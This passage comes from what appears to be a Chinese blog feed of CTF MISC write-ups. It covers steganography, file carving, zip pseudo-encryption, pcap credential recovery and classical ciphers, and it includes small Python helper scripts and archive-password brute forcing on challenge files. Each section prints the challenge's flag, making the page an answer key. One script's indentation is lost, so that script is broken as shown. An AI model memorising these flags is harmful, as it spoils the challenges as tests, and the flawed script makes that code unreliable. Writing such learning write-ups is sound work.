，逐个尝试。<br>最终在第3个修改后成功解压文件。<br>解压出来是一个jpg和一个zip，zip里有flag的文件，需要密码。猜测密码与图片有关。<br>通过上面其它已知办法没法找到密码。于是在网上搜索，了解到一个steghide工具。可以找出图片中的隐写文件。<br>在kali下使用该工具，安装命令为：<br><code>apt-get install steghide</code><br>安装好后，使用命令找出该jpg图片的隐写文件：<br><code>steghide extract -sf good.jpg</code><br>提示需要密码，直接空密码回车<br>得到一个ko.txt文件，打开看得到密码。<br>拿到zip解压，得到flag.txt<br>打开flag文件得到flag：<br><code>flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</code></p><h1 id="33-被劫持的神秘礼物"><a href="#33-被劫持的神秘礼物" class="headerlink" title="33 - 被劫持的神秘礼物"></a>33 - 被劫持的神秘礼物</h1><p>打开百度网盘，得到一个pcapng文件<br>根据题目描述需要找到用户名和密码，那么一般url里有login字段，并且是post方式提交。<br>顺利找到了HTTP包后，翻找字段，得到了用户名和密码，进行md532位小写加密，即可得到答案。</p><h1 id="34-BJDCTF2020-认真你就输了"><a href="#34-BJDCTF2020-认真你就输了" class="headerlink" title="34 - [BJDCTF2020]认真你就输了"></a>34 - [BJDCTF2020]认真你就输了</h1><p>打开rar压缩包，是一个10文件夹，然后里面是一个xls格式的文件。<br>尝试打开，发现显示格式与扩展名不匹配，强制打开是一堆乱码。然后查找互联网，按照网上所说的方式修改注册表。<br>修改注册表后打开，仍然是一堆乱码。<br>通过“格式与扩展名不匹配”和乱码中出现的flag.txt字段，感觉该文件原本不是xls文件。<br>于是修改了扩展名为zip<br>解压后找到flag.txt<br>打开即可得到flag：<br><code>flag&#123;M9eVfi2Pcs#&#125;</code></p><h1 id="35-BJDCTF2020-藏藏藏"><a href="#35-BJDCTF2020-藏藏藏" class="headerlink" title="35 - [BJDCTF2020]藏藏藏"></a>35 - [BJDCTF2020]藏藏藏</h1><p>打开rar压缩包，是一个jpg图片，猜测其中混杂了其它文件，使用binwalk和foremost进行了文件分离。<br>分离出了一个zip，然后解压打开，发现一个二维码。使用QR_Research<br>得到flag：<br><code>flag&#123;you are the best!&#125;</code></p><h1 id="36-被偷走的文件"><a href="#36-被偷走的文件" class="headerlink" title="36 - 被偷走的文件"></a>36 - 被偷走的文件</h1><p>打开zip压缩包，是一个pcapng文件<br>然后使用wireshark打开，进行流量分析，发现ftp协议传输有一个RAR文件。<br>于是使用binwalk和foremost分离文件，得到一个rar文件<br>文件有密码，使用4位纯数字爆破，成功得到flag.txt<br><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p><h1 id="37-刷新过的图片"><a href="#37-刷新过的图片" class="headerlink" title="37 - 刷新过的图片"></a>37 - 刷新过的图片</h1><p>这道题花了2个小时，原因是涉及到新知识，最主要的是出了意料之外的岔子。<br>容我细细讲来。<br>首先题目提示的刷新，那么首先想到的是F5，但是通过F5怎么也没得到flag。<br>于是查了下资料，了解到原来有名为F5隐写的知识。涉及到F5隐写需要使用F5-steganography工具。<br>本来在物理机上git clone了一下，以为很容易解决了。但是却出现了报错。<br>我并不想研究错误的原因，于是在kali上尝试，竟然也出现了同样的报错。<br>这下我不得不研究原因了，搜索了一下发现，原来是这个F5-steganography工具使用了一个名为sun的方法，而这个方法正好在jdk16及以上的版本中不支持了。看了下物理机的jdk版本16，kali的jdk版本17。<br>无奈之下，换了另一台虚拟机Ubuntu，发现它的jdk版本是11，这下我大喜过望，正当以为能解决的时候。<br>发现ssh又连不上，这次的原因并非是ssh未启动，而是22端口未开放。本来我也想到是这个原因，但问题在于我忘记了Ubuntu的防火墙命令，只记得一个另外的firewalld和iptables。最后在网上查了下资料发现命令是ufw。<br>于是我把22端口开放。然后ssh成功连接。<br>正当我以为万事大吉，结果发现无法上传文件。试了好几次都不行，于是采用了网上的方式，使用rz命令。<br>安装rz需要root权限，但是我却发现密码不对。root密码居然和开机密码不同，于是我只好改了密码。<br>然后终于能在xshell里使用rz命令，上传了Misc.jpg图片，安装F5-steganography工具。解决了另外一些小问题。使用了命令：<br><code>java Extract Misc.jpg</code><br>得到了output.txt<br>将其下载到物理机，打开看到PK字段，推测是zip文件，将文件扩展名改为zip，需要密码，打开010editor查看是伪加密。<br>最终拿到了flag.txt<br><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p><h1 id="38-GXYCTF2019-佛系青年"><a href="#38-GXYCTF2019-佛系青年" class="headerlink" title="38 - [GXYCTF2019]佛系青年"></a>38 - [GXYCTF2019]佛系青年</h1><p>zip文件是伪加密，直接修改即可。<br>然后拿到fo.txt，打开以看是与佛论禅的加密。<br>于是直接搜索在线加解密的与佛论禅。<br>直接得到flag<br><code>flag&#123;w0_fo_ci_Be1&#125;</code></p><h1 id="39-BJDCTF2020-你猜我是个啥"><a href="#39-BJDCTF2020-你猜我是个啥" class="headerlink" title="39 - [BJDCTF2020]你猜我是个啥"></a>39 - [BJDCTF2020]你猜我是个啥</h1><p>将文件下载，是一个zip，但实际不是zip文件，打开010editor，发现是一个png文件，改为png之后，是一个二维码。<br>使用QR_Research工具发现flag不在。再次打开010editor，发现文件底部有flag<br><code>flag&#123;i_am_fl@g&#125;</code></p><h1 id="40-snake"><a href="#40-snake" class="headerlink" title="40 - snake"></a>40 - snake</h1><p>打开压缩文件，得到一个jpg，通过010editor查看，得知jpg中混杂了其它文件。<br>使用binwalk和foremost分离文件，得到zip<br>解压zip，得到cipher和key两个文件。<br>先打开key这个文件，是一个base64编码，解码得到：<br><code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code><br>网上搜了下，得到密钥为anaconda(必须全小写)<br>然后，由于snake的另一个同义词是serpent<br>serpent是一种加密方式。<br>于是找到这个加解密网站：<a href="http://serpent.online-domain-tools.com/">Serpent – Symmetric Ciphers Online</a><br>将文件上传，使用密钥，模式为ECB<br>最终得到flag，整理得：<br><code>flag&#123;who_knew_serpent_cipher_existed&#125;</code></p><p>这种题还是挺难的，难在需要联想到蛇的另一个单词是一种加解密的方式。不过也更符合真实场景。</p><h1 id="41-秘密文件"><a href="#41-秘密文件" class="headerlink" title="41 - 秘密文件"></a>41 - 秘密文件</h1><p>本题解法和第36题一模一样。不过多赘述。</p><h1 id="42-BJDCTF2020-just-a-rar"><a href="#42-BJDCTF2020-just-a-rar" class="headerlink" title="42 - [BJDCTF2020]just_a_rar"></a>42 - [BJDCTF2020]just_a_rar</h1><p>打开rar文件，还是一个rar，提示4位数，直接使用ARCHPR工具爆破4位纯数字，得到密码2016<br>密码得到后解压得到flag.jpg<br>打开010editor粗略看了一眼，以为是文件分离，但是实际操作发现不是。<br>再仔细看了下，原来flag藏在了16进制的中间，即可得：<br><code>flag&#123;Wadf_123&#125;</code></p><h1 id="43-BJDCTF2020-鸡你太美"><a href="#43-BJDCTF2020-鸡你太美" class="headerlink" title="43 - [BJDCTF2020]鸡你太美"></a>43 - [BJDCTF2020]鸡你太美</h1><p>打开rar文件，得到两个gif，其中一个能打开，一个不能，不能打开得gif通过010editor查看，发现缺少了gif文件头，添加上文件头后，即可出现flag<br><code>flag&#123;zhi_yin_you_are_beautiful&#125;</code></p><h1 id="44-菜刀666"><a href="#44-菜刀666" class="headerlink" title="44 - 菜刀666"></a>44 - 菜刀666</h1><p>打开rar文件，得到一个pcapng文件<br>使用wireshark工具打开，分析流量，找到一个最大的HTTP数据包，然后follow HTTP Stream<br>发现了其中含有大量16进制数据，查看开头结尾，发现是一个jpg格式文件。<br>拿到在线网站转文件，得到一个jpg<br>找到了密码（一开始我把密码当成是flag了，尴尬）：<br><code>Th1s_1s_p4sswd_!!!</code></p><p>然后发现pcapng里有一个zip文件，拿去foremost分离<br>得到一个zip，需要密码，就是之前发现的那个。解压后拿到flag：<br><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p><h1 id="45-BJDCTF2020-一叶障目"><a href="#45-BJDCTF2020-一叶障目" class="headerlink" title="45 - [BJDCTF2020]一叶障目"></a>45 - [BJDCTF2020]一叶障目</h1><p>使用010editor打开，修改了一下宽高，发现图片有变化，说明需要改为原来的宽高。<br>使用网上找的CRC修复脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="built_in">str</span>(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><p>将脚本与图片置于同一文件夹下，即可得到原来的图片，拿到flag：<br><code>flag&#123;66666&#125;</code></p><h1 id="46-SWPU2019-神奇的二维码"><a href="#46-SWPU2019-神奇的二维码" class="headerlink" title="46 - [SWPU2019]神奇的二维码"></a>46 - [SWPU2019]神奇的二维码</h1><p>打开压缩文件，是一个二维码，首先用QR Research工具扫描二维码，发现flag不在。<br>然后拿去分离，foremost分离不了，用binwalk分离，命令是：<br><code>binwalk -e BitcoinPay.png --run-as=root</code><br>得到几个rar，doc，jpg，txt文件。<br>分别打开，看到比较可疑的是18394.rar文件，设有密码，无法打开。查看文件头，确实是rar文件。但是无法爆破。<br>打开encode.txt，一个base64编码，解码后是一串无效数字。然后打开flag.doc的文件，里面是base64编码了很多次字符串。<br>使用python脚本对base64解码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">s</span>):</span><br><span class="line">    n=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            n+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Base64共decode了&#123;0&#125;次，最终结果如下：&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(s,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;base64.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    decode(f)</span><br></pre></td></tr></table></figure><p>解码得到真正的rar文件的密码，打开得到mp3文件。<br>mp3文件使用Audacity工具打开，发现是摩尔斯电码：<br><code>-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</code></p><p>解密得到flag：<br><code>flag&#123;morseisveryveryeasy&#125;</code></p><h1 id="47-BJDCTF2020-纳尼"><a href="#47-BJDCTF2020-纳尼" class="headerlink" title="47 - [BJDCTF2020]纳尼"></a>47 - [BJDCTF2020]纳尼</h1><p>打开rar文件，发现是一个gif和txt。txt文件提示gif文件打不开<br>那么通过010Editor工具打开gif文件，发现缺少了文件头。<br>添加上文件头后能打开gif，显示了一个base64编码的字符串：<br><code>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</code><br>解码后得到flag：<br><code>flag&#123;wang_bao_qiang_is_sad&#125;</code></p><h1 id="48-梅花香之苦寒来"><a href="#48-梅花香之苦寒来" class="headerlink" title="48 - 梅花香之苦寒来"></a>48 - 梅花香之苦寒来</h1><p>打开压缩文件，得到一个文件夹，里面有一个jpg文件。<br>使用010editor工具打开，发现图片数据之后有一大串16进制数据。将16进制数据复制到在线网站直接转为txt文件。<br>打开txt文件发现是一系列二维坐标。<br>那么根据提示是需要二维坐标绘图，在Linux下使用gnuplot工具，使用这个工具需要把坐标转化为 <code>A B</code> 的形式，直接把 <code>(A,B)</code> 替换即可。<br>需要下载(之前网上某个教程居然叫下压缩包自己编译，又麻烦又容易出错，简直蠢到家了)，直接使用命令即可：<br><code>apt-get install gnuplot</code><br>绘制出二维码，然后截图保存为二维码的png文件，拿到QR Research识别。得到flag：<br><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p><p>这道题也花了不少时间，一个小时左右。主要一开始不想用Linux的这个gnuplot工具，觉得麻烦。为此去试了下python的绘图工具，但出错了。兜兜转转还是选择了这个。<br>很烦欸。</p><h1 id="49-HBNIS2018-excel破解"><a href="#49-HBNIS2018-excel破解" class="headerlink" title="49 - [HBNIS2018]excel破解"></a>49 - [HBNIS2018]excel破解</h1><p>直接拿到010editor，搜索flag，结束：<br><code>flag&#123;office_easy_cracked&#125;</code></p><h1 id="50-穿越时空的思念"><a href="#50-穿越时空的思念" class="headerlink" title="50 - 穿越时空的思念"></a>50 - 穿越时空的思念</h1><p>下载了一段mp3，打开一听明显是摩尔斯电码，但是用Audacity工具打开发现音频有问题，这里不再演示。<br>这个题解不错，推荐一下：<a href="https://www.cnblogs.com/tac2664/p/13861595.html">题解</a><br>用Audacity工具将音频完全转化为右声道，这样就只有摩尔斯电码的声音了。<br>然后导出为wav文件，拿到kali使用morse2ascii工具: <code>morse2ascii xxx.wav</code><br>顺带一提morse2ascii工具在kali下安装方法: <code>apt-get install morse2ascii</code><br>flag：<br><code>flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;</code></p><h1 id="51-HBNIS2018-来题中等的吧"><a href="#51-HBNIS2018-来题中等的吧" class="headerlink" title="51 - [HBNIS2018]来题中等的吧"></a>51 - [HBNIS2018]来题中等的吧</h1><p>打开压缩文件，得到一个png<br>从png看是一个摩尔斯电码：<br><code>.- .-.. .--. .... .- .-.. .- -...</code><br>得到：<br><code>flag&#123;alphalab&#125;</code></p><h1 id="52-ACTF新生赛2020-outguess"><a href="#52-ACTF新生赛2020-outguess" class="headerlink" title="52 - [ACTF新生赛2020]outguess"></a>52 - [ACTF新生赛2020]outguess</h1><p>打开压缩文件，得到一个jpg，一个txt和一个zip文件。<br>txt无有效信息，jpg的属性里面有一个：<br><code>公正民主公正文明公正和谐</code><br>是社会主义核心价值观加解密，拿去解密得到：<br><code>abc</code><br>结合题目可知是outguess工具图片隐写。<br>在kali下使用命令安装outguess：<br><code>apt install outguess</code><br>outguess解密：<br><code>outguess -k &quot;abc&quot; -r mmm.jpg input.txt</code><br>打开txt文件，flag整理得：<br><code>flag&#123;gue33_Gu3Ss!2020&#125;</code></p><h1 id="53-谁赢了比赛？"><a href="#53-谁赢了比赛？" class="headerlink" title="53 - 谁赢了比赛？"></a>53 - 谁赢了比赛？</h1><p>打开压缩包，得到一张包含围棋棋谱的png<br>一开始以为是什么棋谱之类的加密，但后来发现不是。<br>拿去使用binwalk和foremost分离文件。<br>然后得到一个rar文件。<br>发现需要密码，使用4位纯数字爆破，得到密码1020<br>打开rar文件，得到一个txt和gif文件，txt文件里无有效信息。<br>使用Stegsolve工具，用Frame Browser将gif逐帧播放，发现第310帧有一串文字，将这一帧文件保存为bmp文件。<br>再用Stegsolve工具打开bmp文件，在Red 0通道发现了二维码。使用QR Research读取到flag：<br><code>flag&#123;shanxiajingwu_won_the_game&#125;</code></p><h1 id="54-WUSTCTF2020-find-me"><a href="#54-WUSTCTF2020-find-me" class="headerlink" title="54 - [WUSTCTF2020]find_me"></a>54 - [WUSTCTF2020]find_me</h1><p>从属性栏找到以下盲文：<br><code>⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</code><br>解密得：<br><code>wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</code><br>整理flag得：<br><code>flag&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</code></p><h1 id="55-SWPU2019-我有一只马里奥"><a href="#55-SWPU2019-我有一只马里奥" class="headerlink" title="55 - [SWPU2019]我有一只马里奥"></a>55 - [SWPU2019]我有一只马里奥</h1><p>打开压缩文件，得到一个exe文件，点击exe文件，得到一个1.txt<br>打开txt文件，得到提示信息：<br><code>ntfs      flag.txt</code><br>那么搜索ntfs相关的工具，得到NtfsStreamEditor工具，下载后打开：<br>设置路径为exe存在的目录，得到flag.txt文件。然后导出该文件。<br>打开flag.txt文件，得到flag：<br><code>flag&#123;ddg_is_cute&#125;</code></p><h1 id="56-GUET-CTF2019-KO"><a href="#56-GUET-CTF2019-KO" class="headerlink" title="56 - [GUET-CTF2019]KO"></a>56 - [GUET-CTF2019]KO</h1><p>使用 <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook!</a> 可得到flag:<br><code>flag&#123;welcome to CTF&#125;</code></p><h1 id="57-GXYCTF2019-gakki"><a href="#57-GXYCTF2019-gakki" class="headerlink" title="57 - [GXYCTF2019]gakki"></a>57 - [GXYCTF2019]gakki</h1><p>打开压缩包得到一张jpg，010editor查看发现有文件附加，直接用foremost分离得到rar文件<br>然后使用ARCHPR工具4位纯数字爆破，得到密码8864<br>然后得到flag.txt，打开一看是完全无序的字符，一开始以为是什么文件，做成了16进制文件发现并不是。<br>思考良久后，使用了频率统计的方式。<br>可以随便找一个在线网站频率统计，也可以用python写一个频率统计的脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到：<br><code>GXY&#123;gaki_IsMyw1fe&#125;</code><br>整理得：<br><code>flag&#123;gaki_IsMyw1fe&#125;</code></p><h1 id="58-ACTF新生赛2020-base64隐写"><a href="#58-ACTF新生赛2020-base64隐写" class="headerlink" title="58 - [ACTF新生赛2020]base64隐写"></a>58 - [ACTF新生赛2020]base64隐写</h1><p>打开压缩包得到一个tar文件，解压得到两个zip，将 近在眼前.zip 再解压得到一个png和一个txt，png是公众号二维码无用，txt全是base64编码的数据。<br>看出来应该是base64隐写类型。<br>那么在网上找了个python脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ComeOn!.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        rowb64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))</span></span><br><span class="line">            <span class="comment"># print(flag) 这样写得不出正确结果</span></span><br><span class="line">        <span class="built_in">print</span>([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p>用脚本跑了一遍得到了flag：<br><code>flag&#123;6aseb4_f33!&#125;</code></p><h1 id="59-MRCTF2020-ezmisc"><a href="#59-MRCTF2020-ezmisc" class="headerlink" title="59 - [MRCTF2020]ezmisc"></a>59 - [MRCTF2020]ezmisc</h1><p>打开压缩包得到一个png<br>打开图片感觉是一个修改了宽高的图片，用010editor工具修改宽高，图片有明显变化，于是继续修改宽高，得到flag：<br><code>flag&#123;1ts_vEryyyyyy_ez!&#125;</code></p><h1 id="60-caesar"><a href="#60-caesar" class="headerlink" title="60 - caesar"></a>60 - caesar</h1><p>打开txt文件，得到描述信息：<br><code>gmbhjtdbftbs</code><br>由于题目是caesar，中文意思为凯撒<br>那么明显是凯撒加密<br>那么使用在线工具解密，偏移量为1<br>得到flag：<br><code>flag&#123;flagiscaesar&#125;</code></p><h1 id="61-SWPU2019-伟大的侦探"><a href="#61-SWPU2019-伟大的侦探" class="headerlink" title="61 - [SWPU2019]伟大的侦探"></a>61 - [SWPU2019]伟大的侦探</h1><p>打开压缩文件，发现需要密码才能打开misc文件夹，而txt文件不需要，所以直接解压出txt文件。<br>然后txt文件打开，发现需要更改编码才能看到正确的密码，于是打开010editor工具，在右下角改编码为EBCDIC<br>得到正确的密码：<br><code>wllm_is_the_best_team!</code><br>然后成功解压出misc文件夹，里面是18张jpg文件，是跳舞小人，福尔摩斯中的加解密方式。<br>于是搜索对应的密码表，分别一一对应，得到flag：<br><code>flag&#123;iloveholmesandwllm&#125;</code></p><h1 id="62-黑客帝国"><a href="#62-黑客帝国" class="headerlink" title="62 - 黑客帝国"></a>62 - 黑客帝国</h1><p>打开压缩文件，得到一个txt文件。打开是大量的字符，看起来没什么规律，但是仔细看开头 <code>52 61 72 21</code> 。这是rar文件头，于是使用在线工具将16进制转为文件，得到一个rar。<br>rar文件有密码，用ARCHPR工具4位数字爆破，得到了密码。<br>打开rar文件，是一个png文件，但是打不开。<br>使用010editor工具仔细看，发现并不是png文件，而是jpg文件，将文件头前4位改为 <code>FF D8 FF E0</code><br>再将文件扩展名改为jpg<br>打开拿到flag：<br><code>flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</code></p><h1 id="63-HBNIS2018-低个头"><a href="#63-HBNIS2018-低个头" class="headerlink" title="63 - [HBNIS2018]低个头"></a>63 - [HBNIS2018]低个头</h1><p>考得很妙。<br>打开txt文件，得到密文：<br><code>EWAZX RTY TGB IJN IO KL</code><br>低个头，指看键盘。<br>得到flag：<br><code>flag&#123;CTF&#125;</code></p><h1 id="64-MRCTF2020-你能看懂音符吗"><a href="#64-MRCTF2020-你能看懂音符吗" class="headerlink" title="64 - [MRCTF2020]你能看懂音符吗"></a>64 - [MRCTF2020]你能看懂音符吗</h1><p>下载了压缩文件后，发现格式不正确，打开010editor工具，发现文件头有误，修改为rar正确的文件头: <code>52 61 72 21</code><br>rar文件能够正常打开，得到一个docx文件。发现格式不对，使用010editor工具，发现文件头是 <code>50 4B 03 04</code><br>这是zip文件头，于是把文件扩展名修改为zip，打开得到一些xml和其它文件。<br>逐个打开查看，在word文件夹下的document.xml文件，用浏览器打开，发现音符，使用在线音符解密，得到：<br><code>MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</code><br>整理flag：<br><code>flag&#123;thEse_n0tes_ArE_am@zing~&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;MISC杂项的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="MISC杂项" scheme="http://example.com/categories/CTF/MISC%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
